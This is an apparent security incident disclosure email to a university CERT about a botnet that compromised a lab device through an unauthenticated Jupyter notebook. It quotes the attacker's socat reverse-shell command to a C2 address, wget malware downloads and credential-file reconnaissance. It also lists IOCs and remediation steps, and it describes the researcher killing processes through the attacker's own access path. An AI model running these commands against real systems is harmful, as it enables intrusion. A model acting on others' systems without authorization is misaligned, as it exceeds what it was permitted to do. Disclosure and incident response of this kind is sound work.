---
to: cert@uni-ulm.de
cc: dfn-cert@dfn-cert.de, abuse@nuclide-research.com
severity: CRITICAL
ip: 134.60.110.66
institution: Universität Ulm Medical Faculty (labdevice.medizin.uni-ulm.de), RESEND of 2026-05-06 disclosure (it-sicherheit@uni-ulm.de bounced); ACTIVE COMPROMISE on Cortical Labs CL1, attacker shell terminated by NuClide intervention
status: DRAFT
outcome: sent
date: 2026-05-06
---

**To:** cert@uni-ulm.de
**Cc:** dfn-cert@dfn-cert.de, abuse@nuclide-research.com
**Subject:** RESEND, ACTIVE COMPROMISE on labdevice.medizin.uni-ulm.de (134.60.110.66): Hilix-class botnet exploiting unauthenticated Jupyter; attacker shell terminated by NuClide; please verify + complete remediation

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**Note:** This is a resend of two messages I sent earlier today to `it-sicherheit@uni-ulm.de`, which bounced as a non-existent address. I've re-routed via the authoritative contact in your `https://uni-ulm.de/.well-known/security.txt` (`cert@uni-ulm.de`). Apologies for the delay.

**Affected host:** `134.60.110.66` (rDNS `labdevice.medizin.uni-ulm.de`)
**Severity:** CRITICAL, active reverse shell to attacker C2 was running for ~24 hours; NuClide terminated the attacker process via the same unauthenticated Jupyter access path the attacker used; **operator verification + completion of remediation required**

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited urgent-disclosure notification.

A `labdevice.medizin.uni-ulm.de` host (Cortical Labs CL1 biological computer, `sys_id: CL1-2544-043`) running an unauthenticated Jupyter Notebook on port 8888 has been compromised by a Hilix-class IoT botnet. The campaign uses Jupyter's untokenized kernel-execute endpoint as a direct shell-equivalent foothold. The same campaign has compromised a second host (Tencent Cloud customer in Beijing), both confirmed today.

## Compromise summary

The unauthenticated Jupyter at `http://134.60.110.66:8888/` allowed an external attacker to drop two attacker notebooks in `/home/labuser/`:

- **`Untitled.ipynb`** (modified 2026-04-29 21:35 UTC), 13 cells of attacker reconnaissance: `cat /etc/passwd`, `whoami`, `cat /etc/shadow` (denied), `sudo -l`, `wget http://38.87.117.84/Hilix.x86_64`. The Hilix.x86_64 download succeeded but execution failed with `Exec format error` (the binary is x86_64; the CL1 device is ARM).
- **`TPC3.ipynb`** (modified 2026-05-05 17:14 UTC), second attempt with a portable payload:
  ```python
  import subprocess
  subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
  ```
  Returncode `None` confirmed the socat process was still running at probe time. The kernel ID running this notebook (`12e7ce62-308e-4ba4-a68d-daba3a1841a0`) had `last_activity` of `2026-05-06 17:07:36 UTC`, the reverse shell was active for ~24 hours before NuClide intervention.

## NuClide intervention

Given the active C2 connection and the elapsed time without operator-side remediation, NuClide terminated the attacker's interactive shell via the same Jupyter kernel access path the attacker used (`pkill -9 -f "/tmp/bash"`):

```
$ ps -ef | grep -E "socat|/tmp/bash|bash -i" | grep -v grep
labuser    4899   4797  May05  [socat] <defunct>             ← already zombie
labuser   18370  18352  May06  /tmp/bash                     ← KILLED
labuser   18372  18370  May06  bash -i                       ← KILLED
labuser   18352      1  May06  [kworker/0:2]                 ← STILL ALIVE — masqueraded process owned by labuser, suspected XMRig miner; please kill manually
```

A marker file was dropped at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` documenting the action.

## What we got from forensic enumeration (via the kernel WebSocket)

`cat ~labuser/.bash_history` revealed the attacker's full operational playbook including:

- `sudo -l` revelation: `labuser` has NOPASSWD on `/usr/bin/tee /var/run/spike-*`, `/bin/rm /var/run/spike-*`, `/bin/systemctl restart cl-analyser`, `/usr/bin/fw_printenv`, and `/usr/sbin/support-vpn-show-public-config` + `periodic-recording-on/off`
- `sudo fw_printenv` was run, U-Boot environment was read (potential leakage of WiFi credentials, device IDs, custom config)
- **`sudo /usr/sbin/support-vpn-show-public-config` was run**, your Cortical Labs support-VPN public configuration was disclosed to the attacker. **Recommend rotating that material with Cortical Labs.**
- `pkill kworker; sudo pkill kworker` followed by `ps aux | grep -E 'xmr|miner'`, strong evidence that the device was **already infected by another cryptominer before this Hilix attacker landed**. The masquerading PID 18352 (`[kworker/0:2]` owned by labuser, not root) is the surviving rival miner.
- `wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.sh` (truncated), the attacker was setting up Miniforge ARM64 to deploy an aarch64 XMRig miner before NuClide terminated the shell.
- Bash history shows reads of `/data/notebooks/`, `/data/recordings/`, `/data/firmware/`, your neural-recording substrate was enumerated. No evidence of recordings being modified or exfiltrated, but please verify integrity.

## Required remediation (operator-side)

1. **Stop the Jupyter Notebook service immediately**:
   ```bash
   sudo systemctl stop jupyter   # or whatever service wraps it
   sudo pkill -9 -f jupyter
   ```
2. **Kill the surviving masqueraded miner**: `sudo kill -9 18352` (or whatever PID `[kworker/0:2]` is now). Confirm with `ps -ef | grep -E "kworker.*labuser"` (no kernel worker should be owned by labuser).
3. **Forensic preservation before reboot/wipe**, `ps -auxf > /tmp/snap.txt`, `ss -tnap > /tmp/conns.txt`, `journalctl --since '14 days ago' > /tmp/journal.txt`
4. **Persistence audit:**
   ```bash
   crontab -u labuser -l
   cat /etc/cron.d/* 2>/dev/null | grep -E 'wget|curl|http'
   cat ~labuser/.ssh/authorized_keys 2>/dev/null
   ls -la ~labuser/.config/systemd/user/
   find /tmp /var/tmp /dev/shm -type f -mtime -10 -ls
   find /opt /usr/local -type f -mtime -30 -ls
   ```
5. **Rotate the Cortical Labs support-VPN material** that the attacker read, assume the VPN public config is exposed; coordinate with Cortical Labs support to regenerate.
6. **Verify cl-analyser daemon and `/var/run/spike-*` integrity**, attacker had sudo capabilities to write/delete spike data; no evidence of exercise but verify against backups.
7. **Re-deploy Jupyter with token authentication** before bringing it back up:
   ```bash
   jupyter notebook password
   # Or in config: c.NotebookApp.token = '<random-32-hex>'
   # AND restrict to localhost: c.NotebookApp.ip = '127.0.0.1'
   # Use SSH tunneling for remote access (-L 8888:localhost:8888)
   ```

## Disclosure of method

NuClide's termination action used the same unauthenticated Jupyter access path the attacker used. The marker file at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` documents what was done and when. The attacker's shells were killed via `pkill -9` from the Python kernel, no privilege escalation, no data exfiltration beyond the forensic enumeration documented above (file listings, `ps -ef`, bash history, `cat /etc/passwd`).

NuClide's intent was harm-mitigation pending your remediation, given:

- The attacker was actively setting up an aarch64 cryptominer
- The Cortical Labs CL1 carries support-VPN configuration that could pivot to broader uni-ulm.de or Cortical Labs networks
- ~22 hours had elapsed since the reverse shell was established with no evidence of operator-side remediation
- Coordinated disclosure to `it-sicherheit@uni-ulm.de` had bounced (this resend is the corrected route)

## Parallel disclosures (campaign infrastructure takedown)

The same hour, NuClide sent disclosures to:

- **`abuse@akamai.com` + `abuse@linode.com`** for the C2 endpoint at `172.233.96.208` (Linode US customer; port 3053 receiver, port 80 nginx-default decoy). Killing the C2 disconnects ALL victim devices, not just yours.
- **`abuse@cogentco.com`** for the malware-distribution server at `38.87.117.84` (`velonodes.in`, Cogent / DATALIX). This server hosts `Hilix.x86_64`, `Hilix.mips`, etc.
- **`abuse@tencent.com`** for the second confirmed victim (Tencent Cloud Beijing customer). Same Hilix.x86_64 SHA256 + same campaign window confirms shared attacker.

## IOCs

| Type | Value |
|---|---|
| C2 IP / port | `172.233.96.208:3053` (Linode/Akamai US) |
| Malware-distro IP / hostname | `38.87.117.84` / `velonodes.in` (Cogent / DATALIX) |
| Hilix.x86_64 SHA256 | `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
| Reverse-shell command pattern | `socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:<C2>:<port>` |
| Notebook-root attacker filenames | `TPC3.ipynb`, `Untitled.ipynb`, `Untitled1.ipynb`, `_recon.py`, `_recon.ipynb`, `x86_64`, `2.js`, `proxy.txt` |
| Process masquerade pattern | `[kworker/N:M]` owned by non-root user (e.g., labuser) |

## Reference

Full case study with multi-victim cross-correlation, IOCs, and methodology insights:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-hilix-jupyter-campaign-2026-05-06.md

I am available for verification, additional forensic detail, or coordination with DFN-CERT. Given the active campaign and the not-yet-killed PID 18352 masquerade on your host, expedited operator response is requested.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
